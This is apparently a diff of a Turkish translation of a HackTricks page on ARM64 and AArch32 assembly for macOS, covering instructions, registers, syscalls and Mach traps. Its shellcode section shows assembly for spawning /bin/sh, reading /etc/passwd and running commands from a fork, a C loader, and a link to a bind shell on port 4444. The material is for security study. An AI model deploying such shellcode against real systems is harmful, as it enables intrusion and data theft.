-* Bu, bağlantı kaydırıcısını dönüş adresiyle doldurmayacaktır (geri dönmesi gereken alt program çağrıları için uygun değildir)
-* **`bl`**: **Bağlantılı Atlama**, bir **alt programı çağırmak** için kullanılır. Dönüş adresini `x30`'da saklar.
+* Örnek: `b myFunction`
+* Bu, dönüş adresiyle bağlantı kaydırıcısını doldurmayacaktır (geri dönmesi gereken alt program çağrıları için uygun değildir)
+* **`bl`**: **Bağlantı ile Atlama**, bir **alt programı çağırmak** için kullanılır. Dönüş adresini `x30`'da saklar.
 * Örnek: `bl myFunction` — Bu, `myFunction` fonksiyonunu çağırır ve dönüş adresini `x30`'da saklar.
-* Bu, bağlantı kaydırıcısını dönüş adresiyle doldurmayacaktır (geri dönmesi gereken alt program çağrıları için uygun değildir)
-* **`blr`**: **Kayıtlı Bağlantılı Atlama**, hedefi bir **kayıtta belirtilen** bir **alt programı çağırmak** için kullanılır. Dönüş adresini `x30`'da saklar. (Bu&#x20;
+* Bu, dönüş adresiyle bağlantı kaydırıcısını doldurmayacaktır (geri dönmesi gereken alt program çağrıları için uygun değildir)
+* **`blr`**: **Kayıtlı Bağlantı ile Atlama**, hedef **bir kayıtta belirtilen** bir **alt programı çağırmak** için kullanılır. Dönüş adresini `x30`'da saklar. (Bu
 * Örnek: `blr x1` — Bu, adresi `x1` içinde bulunan fonksiyonu çağırır ve dönüş adresini `x30`'da saklar.
-* **`ret`**: **Alt programdan dön**, genellikle **`x30`** içindeki adresi kullanarak.
-* Örnek: `ret` — Bu, mevcut alt programdan `x30` içindeki dönüş adresini kullanarak döner.
+* **`ret`**: **Alt programdan dön**, genellikle **`x30`** adresini kullanarak.
+* Örnek: `ret` — Bu, mevcut alt programdan `x30` adresindeki dönüş adresini kullanarak döner.
 * **`b.<cond>`**: Koşullu atlama
-* **`b.eq`**: **Eşitse Atlama**, önceki `cmp` talimatına dayanarak.
-* Örnek: `b.eq label` — Eğer önceki `cmp` talimatı iki eşit değer bulursa, bu `label`'a atlar.
+* **`b.eq`**: **Eşitse Atlama**, önceki `cmp` talimatına dayanır.
+* Örnek: `b.eq label` — Önceki `cmp` talimatında iki eşit değer bulunursa, bu `label`'a atlar.
 * **`b.ne`**: **Eşit Değilse Dal**. Bu talimat, koşul bayraklarını kontrol eder (önceki bir karşılaştırma talimatı tarafından ayarlanmıştır) ve karşılaştırılan değerler eşit değilse, bir etikete veya adrese dalış yapar.
-* Örnek: `cmp x0, x1` talimatından sonra, `b.ne label` — `x0` ve `x1` değerleri eşit değilse, bu `label`'e atlar.
-* **`cbz`**: **Sıfıra Karşılaştır ve Dal**. Bu talimat bir kaydı sıfır ile karşılaştırır ve eğer eşitlerse, bir etikete veya adrese dalış yapar.
-* Örnek: `cbz x0, label` — `x0`'daki değer sıfırsa, bu `label`'e atlar.
-* **`cbnz`**: **Sıfır Olmayanı Karşılaştır ve Dal**. Bu talimat bir kaydı sıfır ile karşılaştırır ve eğer eşit değillerse, bir etikete veya adrese dalış yapar.
-* Örnek: `cbnz x0, label` — `x0`'daki değer sıfır olmayan bir değerse, bu `label`'e atlar.
+* Örnek: `cmp x0, x1` talimatından sonra, `b.ne label` — Eğer `x0` ve `x1` içindeki değerler eşit değilse, bu `label`'e atlar.
+* **`cbz`**: **Sıfır ile Karşılaştır ve Dal**. Bu talimat bir kaydı sıfır ile karşılaştırır ve eğer eşitlerse, bir etikete veya adrese dalış yapar.
+* Örnek: `cbz x0, label` — Eğer `x0` içindeki değer sıfırsa, bu `label`'e atlar.
+* **`cbnz`**: **Sıfır Olmayan ile Karşılaştır ve Dal**. Bu talimat bir kaydı sıfır ile karşılaştırır ve eğer eşit değillerse, bir etikete veya adrese dalış yapar.
+* Örnek: `cbnz x0, label` — Eğer `x0` içindeki değer sıfır olmayan bir değerse, bu `label`'e atlar.
 * **`tbnz`**: Biti Test Et ve Sıfır Olmayan Durumda Dal
 * Örnek: `tbnz x0, #8, label`
-* **`tbz`**: Biti Test Et ve Sıfır Durumunda Dal
+* **`tbz`**: Biti Test Et ve Sıfır Durumda Dal
 * Örnek: `tbz x0, #8, label`
-* **Koşullu seçim işlemleri**: Davranışı koşullu bitlere bağlı olan işlemlerdir.
+* **Koşullu seçim işlemleri**: Bu işlemler, davranışı koşullu bitlere bağlı olarak değişen işlemlerdir.
 * `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Doğruysa, X0 = X1, yanlışsa, X0 = X2
 * `csinc Xd, Xn, Xm, cond` -> Doğruysa, Xd = Xn, yanlışsa, Xd = Xm + 1
 * `cinc Xd, Xn, cond` -> Doğruysa, Xd = Xn + 1, yanlışsa, Xd = Xn
@@ -220,13 +220,13 @@ ARM64 komutları genellikle `opcode hedef, kaynak1, kaynak2` formatına sahiptir
 * `cneg Xd, Xn, cond` -> Doğruysa, Xd = - Xn, yanlışsa, Xd = Xn
 * `cset Xd, Xn, Xm, cond` -> Doğruysa, Xd = 1, yanlışsa, Xd = 0
 * `csetm Xd, Xn, Xm, cond` -> Doğruysa, Xd = \<tüm 1>, yanlışsa, Xd = 0
-* **`adrp`**: Bir sembolün **sayfa adresini hesaplar** ve bir kayıtta saklar.
+* **`adrp`**: Bir sembolün **sayfa adresini hesapla** ve bir kayıtta sakla.
 * Örnek: `adrp x0, symbol` — Bu, `symbol`'ün sayfa adresini hesaplar ve `x0`'da saklar.
-* **`ldrsw`**: Bellekten işaretli **32 bitlik** bir değeri **64 bit** olarak **yükler** ve genişletir.
-* Örnek: `ldrsw x0, [x1]` — Bu, `x1` tarafından işaret edilen bellek konumundan işaretli 32 bitlik bir değeri yükler, 64 bit olarak genişletir ve `x0`'a saklar.
-* **`stur`**: Bir kayıt değerini başka bir kayıttan gelen bir ofset kullanarak bir bellek konumuna **saklar**.
-* Örnek: `stur x0, [x1, #4]` — Bu, `x1` içinde bulunan adresin 4 byte daha büyük olduğu bellek adresine `x0`'daki değeri saklar.
-* **`svc`** : Bir **sistem çağrısı** yapar. "Supervisor Call" kısaltmasıdır. İşlemci bu talimatı çalıştırdığında, **kullanıcı modundan çekirdek moda geçer** ve belleğin belirli bir konumuna atlar, burada **çekirdeğin sistem çağrısı işleme** kodu bulunur.
+* **`ldrsw`**: Bellekten işaretle **32 bitlik** bir değeri **64 bit**e genişle ve **yükle**.
+* Örnek: `ldrsw x0, [x1]` — Bu, `x1` tarafından işaret edilen bellek konumundan işaretle 32 bitlik bir değeri yükler, 64 bit'e genişletir ve `x0`'a saklar.
+* **`stur`**: Bir kayıt değerini bir bellek konumuna **kaydet**, başka bir kayıttan bir ofset kullanarak.
+* Örnek: `stur x0, [x1, #4]` — Bu, `x1` içindeki adresin 4 byte daha büyük olan bellek adresine `x0` içindeki değeri kaydeder.
+* **`svc`** : Bir **sistem çağrısı** yap. "Supervisor Call" kısaltmasıdır. İşlemci bu talimatı çalıştırdığında, **kullanıcı modundan çekirdek moduna geçer** ve **çekirdeğin sistem çağrısı işleme** kodunun bulunduğu belirli bir bellek konumuna atlar.
 *   Örnek:
 
 ```armasm
@@ -237,7 +237,7 @@ svc 0       ; Sistem çağrısı yap.
 
 ### **Fonksiyon Prologu**
 
-1. **Bağlantı kaydedici ve çerçeve işaretçisini yığın üzerine kaydedin**:
+1. **Bağlantı kaydedici ve çerçeve işaretçisini yığına kaydet**:
 
 {% code overflow="wrap" %}
 ```armasm
@@ -259,16 +259,16 @@ ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment th
 ```
 {% endcode %}
 
-3. **Dönüş**: `ret` (kontrolü çağırana, link kaydedicideki adrese döndürür)
+3. **Dönüş**: `ret` (kontrolü çağırana link register'daki adrese döndürür)
 
 ## AARCH32 Yürütme Durumu
 
 Armv8-A, 32 bitlik programların yürütülmesini destekler. **AArch32**, **iki komut setinden** birinde çalışabilir: **`A32`** ve **`T32`** ve aralarında **`geçişli çalışma`** ile geçiş yapabilir.\
 **Ayrıcalıklı** 64 bitlik programlar, daha düşük ayrıcalıklı 32 bitlik programa bir istisna seviyesi aktarımı gerçekleştirerek **32 bitlik programların yürütülmesini** planlayabilir.\
-64 bitlikten 32 bitliğe geçişin, istisna seviyesinin düşürülmesiyle gerçekleştiğini unutmayın (örneğin, EL1'de 64 bitlik bir programın EL0'da bir programa tetiklenmesi). Bu, `AArch32` işlem ipliğinin yürütülmeye hazır olduğunda **`SPSR_ELx`** özel kaydedicisinin **4. bitini 1** olarak ayarlayarak ve geri kalan `SPSR_ELx`'in **`AArch32`** programlarının CPSR'ini saklayarak yapılır. Ardından, ayrıcalıklı işlem **`ERET`** komutunu çağırarak işlemcinin **`AArch32`**'ye geçiş yapmasını sağlar ve CPSR'ye bağlı olarak A32 veya T32'ye girer\*\*.\*\*
+64 bitlikten 32 bitliğe geçişin, daha düşük bir istisna seviyesi ile gerçekleştiğini unutmayın (örneğin, EL1'de 64 bitlik bir program EL0'da bir programa tetikleme). Bu, `AArch32` işlem ipliğinin yürütülmeye hazır olduğunda **`SPSR_ELx`** özel kaydının **4. bitini 1** olarak ayarlayarak ve geri kalan `SPSR_ELx`'in **`AArch32`** programlarının CPSR'ını saklayarak yapılır. Ardından, ayrıcalıklı işlem **`ERET`** komutunu çağırarak işlemcinin **`AArch32`**'ye geçiş yapmasını sağlar ve CPSR'a bağlı olarak A32 veya T32'ye girer\*\*.\*\*
 
-**`Geçişli çalışma`**, CPSR'ın J ve T bitleri kullanılarak gerçekleştirilir. `J=0` ve `T=0` **`A32`**'yi, `J=0` ve `T=1` **T32**'yi temsil eder. Bu temelde, komut setinin T32 olduğunu belirtmek için **en düşük bitin 1** olarak ayarlanması anlamına gelir.\
-Bu, **geçişli dallanma komutları** sırasında ayarlanır, ancak PC hedef kaydedici olarak ayarlandığında diğer komutlarla da doğrudan ayarlanabilir. Örnek:
+**`Geçişli çalışma`**, CPSR'ın J ve T bitleri kullanılarak gerçekleştirilir. `J=0` ve `T=0` **`A32`** anlamına gelir ve `J=0` ve `T=1` **T32** anlamına gelir. Bu temelde, komut setinin T32 olduğunu belirtmek için **en düşük bitin 1** olarak ayarlanması anlamına gelir.\
+Bu, **geçişli dallanma komutları** sırasında ayarlanır, ancak PC hedef kayıt olarak ayarlandığında diğer komutlarla doğrudan ayarlanabilir. Örnek:
 
 Başka bir örnek:
 ```armasm
@@ -283,23 +283,22 @@ mov r0, #8
 ```
 ### Kayıtlar
 
-16 adet 32 bitlik kayıt bulunmaktadır (r0-r15). **r0'dan r14'e kadar** herhangi bir işlem için kullanılabilirler, ancak bazıları genellikle ayrılmıştır:
+16 adet 32-bit kayıt bulunmaktadır (r0-r15). **r0'dan r14'e kadar** herhangi bir işlem için kullanılabilirler, ancak bazıları genellikle ayrılmıştır:
 
-- **`r15`**: Program sayacı (her zaman). Bir sonraki talimatın adresini içerir. A32'de mevcut + 8, T32'de mevcut + 4.
+- **`r15`**: Program sayacı (her zaman). Bir sonraki talimatın adresini içerir. A32'de mevcut + 8, T32'de ise mevcut + 4.
 - **`r11`**: Çerçeve İşaretçisi
 - **`r12`**: İç işlevsel çağrı kaydı
 - **`r13`**: Yığın İşaretçisi
-- **`r14`**: Bağlantı Kaydı
+- **`r14`**: Bağlantı Kaydedici
 
-Ayrıca, kayıtlar **`bankalı kayıtlar`**da yedeklenir. Bu, istisna işleme ve ayrıcalıklı işlemlerde hızlı bağlam değiştirme yapabilmek için kayıt değerlerini depolayan yerlerdir, her seferinde kayıtları manuel olarak kaydetme ve geri yükleme ihtiyacını ortadan kaldırmak için.
-
-Bunun için, işlemcinin durumu **`CPSR`**'den işlemcinin alındığı işlemci modunun **`SPSR`**'sine kaydedilir. İstisna dönüşlerinde, **`CPSR`** **`SPSR`**'den geri yüklenir.
+Ayrıca, kayıtlar **`bankalı kayıtlar`**da yedeklenir. Bu, istisna işleme ve ayrıcalıklı işlemlerde **hızlı bağlam değiştirme** yapabilmek için kayıt değerlerini depolayan yerlerdir, böylece her seferinde kayıtları manuel olarak kaydetme ve geri yükleme ihtiyacını ortadan kaldırır.\
+Bu, işlemcinin durumunu istisna alınan işlemcinin moduna **`CPSR`'den `SPSR`'ye** kaydederek yapılır. İstisna dönüşlerinde, **`CPSR`** **`SPSR`**'den geri yüklenir.
 
 ### CPSR - Geçerli Program Durumu Kaydedici
 
-AArch32'de CPSR, AArch64'teki **`PSTATE`** ile benzer şekilde çalışır ve bir istisna alındığında daha sonra geri yüklemek için **`SPSR_ELx`**'de de depolanır:
+AArch32'de CPSR, AArch64'teki **`PSTATE`** ile benzer şekilde çalışır ve bir istisna alındığında daha sonra geri yüklemek için **`SPSR_ELx`**'de depolanır:
 
-<figure><img src="../../../.gitbook/assets/image (1194).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>
 
 Alanlar bazı gruplara ayrılmıştır:
 
@@ -309,33 +308,33 @@ Alanlar bazı gruplara ayrılmıştır:
 #### Uygulama Program Durumu Kaydedici (APSR)
 
 - **`N`**, **`Z`**, **`C`**, **`V`** bayrakları (AArch64'te olduğu gibi)
-- **`Q`** bayrağı: Özel doyurucu aritmetik talimatın yürütülmesi sırasında **tamsayı doygunluğu oluştuğunda** 1 olarak ayarlanır. Bir kez **`1`** olarak ayarlandığında, elle 0 olarak ayarlanana kadar değeri korur. Ayrıca, değerini örtük olarak kontrol eden herhangi bir talimat yoktur, değeri manuel olarak okunarak kontrol edilmelidir.
-- **`GE`** (Büyük veya eşit) Bayraklar: SIMD (Tek Talimat, Çoklu Veri) işlemlerinde kullanılır, örneğin "paralel toplama" ve "paralel çıkarma". Bu işlemler tek bir talimatta birden fazla veri noktasını işlemeyi sağlar.
+- **`Q`** bayrağı: Özel doyurucu aritmetik talimatın yürütülmesi sırasında **tamsayı doygunluğu oluştuğunda** 1 olarak ayarlanır. Bir kez **`1`** olarak ayarlandığında, elle 0 olarak ayarlanana kadar değeri korur. Ayrıca, değerini zımni olarak kontrol eden herhangi bir talimat yoktur, değeri manuel olarak okunarak kontrol edilmelidir.
+- **`GE`** (Büyük veya eşit) Bayraklar: SIMD (Tek Talimat, Çoklu Veri) işlemlerinde kullanılır, örneğin "paralel toplama" ve "paralel çıkarma". Bu işlemler, bir talimattaki birden fazla veri noktasının işlenmesine izin verir.
 
-Örneğin, **`UADD8`** talimatı, paralel olarak dört çift baytı (iki 32 bitlik işleçten) ekler ve sonuçları bir 32 bitlik kayıtta depolar. Ardından, bu sonuçlara dayanarak **`APSR`** içinde **`GE`** bayraklarını ayarlar. Her GE bayrağı, o bayt çifti için eklemenin taştığını gösterir.
+Örneğin, **`UADD8`** talimatı, paralel olarak dört çift baytı (iki 32-bit işleçten) ekler ve sonuçları bir 32-bit kaydedicide depolar. Ardından, bu sonuçlara dayanarak **`APSR`'deki `GE`** bayraklarını ayarlar. Her GE bayrağı, o bayt çifti için eklemenin taştığını gösterir.
 
 **`SEL`** talimatı, bu GE bayraklarını koşullu işlemler yapmak için kullanır.
 
 #### İşlem Durumu Kaydedicileri
 
-- **`J`** ve **`T`** bitleri: **`J`** 0 olmalıdır ve **`T`** 0 ise A32 talimat seti kullanılır, 1 ise T32 kullanılır.
+- **`J`** ve **`T`** bitleri: **`J`** 0 olmalı ve **`T`** 0 ise A32 talimat seti kullanılır, 1 ise T32 kullanılır.
 - **IT Blok Durum Kaydedici** (`ITSTATE`): Bunlar 10-15 ve 25-26'dan gelen bitlerdir. Bir **`IT`** ön ekli grup içindeki talimatlar için koşulları depolarlar.
-- **`E`** biti: **endianness**'ı gösterir.
-- **Mod ve İstisna Maske Bitleri** (0-4): Mevcut yürütme durumunu belirler. 5. olan programın 32 bit (1) veya 64 bit (0) olarak çalıştığını belirtir. Diğer 4'ü, kullanılan mevcut istisna modunu belirtir (bir istisna oluştuğunda ve işlendiğinde). Sayı seti, bunun işlenirken başka bir istisna tetiklenirse mevcut önceliği belirtir.
+- **`E`** biti: **endianness**'ı belirtir.
+- **Mod ve İstisna Maskesi Bitleri** (0-4): Mevcut yürütme durumunu belirler. 5. olan programın 32 bit (1) veya 64 bit (0) olarak çalıştığını belirtir. Diğer 4'ü, kullanılan mevcut istisna modunu belirtir (bir istisna oluştuğunda ve işlendiğinde). Sayı seti, bunun işlenirken başka bir istisna tetiklenirse mevcut önceliği belirtir.
 
-<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: Belirli istisnalar, **`A`**, `I`, `F` bitlerini kullanarak devre dışı bırakılabilir. **`A`** 1 ise **asenkron hatalar** tetikleneceği anlamına gelir. **`I`**, harici donanım **Kesme İstekleri'ne** (IRQ'lar) yanıt vermek için yapılandırılır ve F, **Hızlı Kesme İstekleri'ne** (FIR'lar) ilişkilidir.
+- **`AIF`**: Belirli istisnalar, **`A`**, `I`, `F` bitleri kullanılarak devre dışı bırakılabilir. **`A`** 1 ise **asenkron hatalar** tetikleneceği anlamına gelir. **`I`**, harici donanım **Kesme İstekleri'ne** (IRQ'ler) yanıt vermek için yapılandırılır ve F, **Hızlı Kesme İstekleri'ne** (FIR'ler) ilişkilidir.
 
 ## macOS
 
 ### BSD sistem çağrıları
 
-[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) dosyasına bakın. BSD sistem çağrılarının **x16 > 0** olacaktır.
+[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)'a göz atın. BSD sistem çağrıları **x16 > 0** olacaktır.
 
 ### Mach Tuzakları
 
-[mach_trap_table](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) ve [mach_traps.h](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) dosyalarına bakın. Mach tuzaklarının **x16 < 0** olacaktır, bu nedenle önceki listedeki numaraları bir **eksi** ile çağırmalısınız: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`**'dur.
+[mach_trap_table](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) ve [mach_traps.h](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) içindeki prototiplere bakın. Mach tuzaklarının sayısı `MACH_TRAP_TABLE_COUNT` = 128'dir. Mach tuzakları **x16 < 0** olacaktır, bu nedenle önceki listedeki numaraları bir **eksi** ile çağırmalısınız: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`**'dur.
 
 Bu (ve BSD) sistem çağrılarını nasıl çağıracağınızı bulmak için bir ayraçta **`libsystem_kernel.dylib`**'i kontrol edebilirsiniz:
 
@@ -371,9 +370,9 @@ Parametreler ([daha fazla bilgi için dokümantasyona bakın](https://developer.
 
 * x0: self -> Örneğin işaretçisi
 * x1: op -> Yöntemin seçicisi
-* x2... -> Çağrılan yöntemin geri kalan argümanları
+* x2... -> Çağrılan yöntemin diğer argümanları
 
-Bu nedenle, bu fonksiyona yapılan dal öncesinde kesme noktası koyarsanız, lldb'de neyin çağrıldığını kolayca bulabilirsiniz (bu örnekte, nesne `NSConcreteTask`'tan bir nesneyi çağırır ve bir komut çalıştırır).
+Bu nedenle, bu fonksiyona yapılan dal öncesinde kesme noktası koyarsanız, lldb'de neyin çağrıldığını kolayca bulabilirsiniz (bu örnekte nesne, bir komut çalıştıracak olan `NSConcreteTask` nesnesini çağırır).
 ```
 (lldb) po $x0
 <NSConcreteTask: 0x1052308e0>
@@ -390,6 +389,10 @@ Bu nedenle, bu fonksiyona yapılan dal öncesinde kesme noktası koyarsanız, ll
 whoami
 )
 ```
+{% hint style="success" %}
+`NSObjCMessageLoggingEnabled=1` ortam değişkenini ayarlayarak, bu işlevin `/tmp/msgSends-pid` gibi bir dosyada ne zaman çağrıldığını kaydetmek mümkündür.
+{% endhint %}
+
 ### Kabuk Kodları
 
 Derlemek için:
@@ -416,7 +419,7 @@ done
 ```
 <detaylar>
 
-<özet>C koduyla kabuk kodunu test etmek</özet>
+<özet>Shellcode'u test etmek için C kodu</özet>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -462,8 +465,6 @@ sc();
 return 0;
 }
 ```
-</details>
-
 #### Kabuk
 
 [**buradan**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) alınmış ve açıklanmıştır.
@@ -486,7 +487,7 @@ sh_path: .asciz "/bin/sh"
 ```
 {% endtab %}
 
-{% tab title="yığın ile" %}
+{% tab title="yığınla" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -533,9 +534,12 @@ svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter,
 
 sh_path: .asciz "/bin/sh"
 ```
-#### Cat ile oku
+{% endtab %}
+{% endtabs %}
 
-Amacımız `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmak, bu nedenle ikinci argüman (x1) parametrelerin bir dizisi olmalıdır (bellekte bu adreslerin bir yığını anlamına gelir).
+#### Cat ile okuma
+
+Amacımız `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` komutunu çalıştırmak, bu yüzden ikinci argüman (x1) parametrelerin bir dizisi olmalıdır (bellekte bu adreslerin bir yığını anlamına gelir).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -561,7 +565,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-#### Ana işlem öldürülmezken çataldan sh ile komut çağırma
+#### Ana işlem öldürülmezken bir çataldan sh ile komut çağırma
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -607,7 +611,7 @@ touch_command: .asciz "touch /tmp/lalala"
 ```
 #### Bağlama kabuğu
 
-Bağlama kabuğu [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) üzerinden **4444 numaralı bağlantı noktası**'nda.
+Bağlama kabuğu [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) adresinden **4444 portu** üzerinden.
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -764,10 +768,10 @@ svc  #0x1337
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) içeren koleksiyonumuz
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
 * **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* **Hacking püf noktalarınızı paylaşın, PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.
 
 </details>
